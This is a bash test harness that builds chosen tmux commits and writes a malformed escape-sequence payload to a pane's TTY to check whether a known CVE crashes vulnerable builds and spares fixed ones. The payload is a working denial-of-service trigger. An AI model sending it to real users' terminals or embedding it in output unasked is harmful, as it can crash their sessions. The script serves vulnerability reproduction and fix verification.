#!/usr/bin/env bash
set -euo pipefail

# Function to run a tmux CVE test
# Arguments:
#   $1: Git commit hash to checkout
#   $2: Description of the version (e.g., "vulnerable version", "fixed version")
#   $3: Expected outcome (e.g., "Expecting a crash", "Expecting NO crash")
#   $4: Path to the patch file (optional, e.g., "path/to/your.patch" or "" to skip)
#   $5: Observation period in seconds (optional, defaults to 10 seconds)
run_tmux_test() {
  local commit_hash="$1"
  local version_description="$2"
  local expected_outcome="$3"
  local patch_file_path="${4:-}"      # New parameter for the patch file
  local observation_period="${5:-10}" # Adjusted parameter index

  echo "=========================================="
  echo "Testing ${version_description} (${commit_hash})"
  echo "==========================================="

  echo "Current directory: $(pwd)"
  echo "Fetching latest tags and objects from origin..."
  if ! git fetch origin --tags --prune; then
    echo "WARNING: git fetch origin --tags failed."
  fi

  echo "Attempting to reset to commit: ${commit_hash}"
  if ! git reset --hard "${commit_hash}"; then
    echo "ERROR: Failed to reset to commit ${commit_hash}."
    return 1
  fi
  echo "Successfully reset to commit ${commit_hash}."

  # Apply patch if a patch file path is provided
  if [ -n "$patch_file_path" ]; then
    if [ -f "$patch_file_path" ]; then
      echo "Applying patch: ${patch_file_path}"
      if patch -p1 <"$patch_file_path"; then
        echo "Patch applied successfully."
      else
        echo "ERROR: Failed to apply patch ${patch_file_path}."
        return 1
      fi
    else
      echo "ERROR: Patch file ${patch_file_path} not found."
      return 1
    fi
  fi

  echo "Building tmux from source..."
  if (sh autogen.sh && ./configure && make -j"$(nproc)") >/dev/null 2>&1; then
    echo "Build complete."
  else
    echo "ERROR: Build FAILED: $?"
    return 1
  fi

  # ... (rest of the script remains the same) ...

  echo -e "\n--- Running ${version_description} and attempting to trigger CVE ---"
  echo "Current TERM environment variable: '$TERM'"

  local session_name="cve_test_session_$$" # Unique session name

  echo "Starting tmux with new detached session: ${session_name}"
  # Launch tmux with a new detached session. The command itself exits after starting the server/session.
  if ! ./tmux new-session -d -s "${session_name}"; then
    echo "ERROR: Failed to start tmux new detached session '${session_name}'."
    # Attempt to see if a server is running anyway, could be a client error
    if ! ./tmux ls >/dev/null 2>&1; then
      echo "tmux server also does not appear to be running after 'new-session -d' attempt."
    fi
    return 1
  fi
  echo "tmux new-session -d command completed. Server should be running. Waiting for session to be fully ready..."

  local pane_tty_path=""
  local attempts=20 # Try for up to 10 seconds
  local i
  for i in $(seq 1 $attempts); do
    echo "Attempt $i/$attempts: Checking for session '${session_name}' and pane TTY..."
    local list_panes_output
    # Capture stdout and stderr to see any errors from list-panes
    list_panes_output=$(./tmux list-panes -t "${session_name}" -F '#{pane_tty}' 2>&1)
    local list_panes_exit_code=$?

    if [ $list_panes_exit_code -eq 0 ]; then
      pane_tty_path=$(echo "$list_panes_output" | grep -oP '/dev/pts/\d+' | head -n 1)
      if [ -n "$pane_tty_path" ] && [ -e "$pane_tty_path" ]; then
        echo "tmux session '${session_name}' is ready. Found pane TTY: $pane_tty_path"
        break
      else
        echo "list-panes succeeded (Code: $list_panes_exit_code), but no valid TTY path found/extracted. Output: [$list_panes_output]"
      fi
    else
      echo "list-panes failed (Code: $list_panes_exit_code). Output: [$list_panes_output]"
      # If "no server" or "session not found", it's a critical issue with the detached start
      if [[ "$list_panes_output" == *"no server"* ]] || [[ "$list_panes_output" == *"session not found"* ]]; then
        echo "Critical error: Tmux server or session '${session_name}' not found. Aborting readiness check."
        pane_tty_path="" # Ensure it's empty for the error condition below
        break            # Exit the loop
      fi
    fi

    if [ $i -lt $attempts ]; then
      sleep 0.5
    fi
  done

  # if tty not found after attempts, print error + cleanup + exit
  if [ -z "$pane_tty_path" ]; then
    echo "ERROR: tmux session '${session_name}' did not become ready or pane TTY not found after $attempts attempts."
    echo "Attempting to capture server logs if any..."
    # ./tmux show-buffer -b server-log > server_log_after_fail.txt || echo "Could not get server log."
    ./tmux kill-server >/dev/null 2>&1 || true # Attempt cleanup
    return 1
  fi

  # send exploit payload to the tmux pane
  echo "Sending payload to tmux pane: $pane_tty_path"
  # ensure the TTY path is valid before sending the payload
  if [ -c "$pane_tty_path" ]; then
    # send if valid
    echo -e '\033[::::::7::1:2:3::5:6:7:m' >"$pane_tty_path"
    echo "Payload sent."
  else
    # log + cleanup if invalid TTY
    echo "ERROR: pane_tty_path '$pane_tty_path' is not a valid TTY device. Cannot send payload."
    ./tmux kill-server >/dev/null 2>&1 || true # Attempt cleanup
    return 1
  fi

  # wait a few seconds
  echo -e "\n--- Observing tmux for ${observation_period}s after payload ---"
  sleep "${observation_period}"

  # check if the tmux server is still alive and if the session is still there
  echo "Observation period ended. Checking tmux server and session status..."
  local server_alive_and_session_ok=false
  if ./tmux has-session -t "${session_name}" 2>/dev/null; then
    echo "tmux session '${session_name}' still exists. Server appears to be alive and session is OK."
    server_alive_and_session_ok=true
  else
    echo "tmux session '${session_name}' NOT FOUND."
    # Check if the server is up at all, as the session might have crashed but not the whole server
    if ./tmux ls >/dev/null 2>&1; then
      echo "However, the tmux server IS still running (other sessions might exist or server is idle)."
      echo "For this test, the target session being gone is considered a failure/crash."
      server_alive_and_session_ok=false # Session crashed
    else
      echo "Additionally, the tmux server is NOT responding at all (via 'tmux ls'). Assumed entire server crashed."
      server_alive_and_session_ok=false # Server crashed
    fi
  fi

  # Determine outcome based on server/session status vs. expectations
  if $server_alive_and_session_ok; then
    echo "Outcome: Tmux session '${session_name}' is intact after observation."
    if [[ "$expected_outcome" == "no_crash" ]]; then
      echo "[SUCCESS] This matches expectations for a fixed version."
    else
      echo "[FAILURE] This does NOT match expectations for a vulnerable version (which expected a crash)."
    fi
  else
    echo "Outcome: Tmux session '${session_name}' is GONE or server crashed."
    if [[ "$expected_outcome" == "crash" ]]; then
      echo "[SUCCESS] This matches expectations for a vulnerable version (crash detected)."
    else
      echo "[FAILURE] This does NOT match expectations for a fixed version (which expected NO crash)."
    fi
  fi

  # cleanup after test
  echo -e "\n--- ${version_description} test complete. ---"
  echo "Performing cleanup: killing session ${session_name} (if it exists) and tmux server."
  ./tmux kill-session -t "${session_name}" >/dev/null 2>&1 || true
  ./tmux kill-server >/dev/null 2>&1 || true

  # success quit
  return 0
}
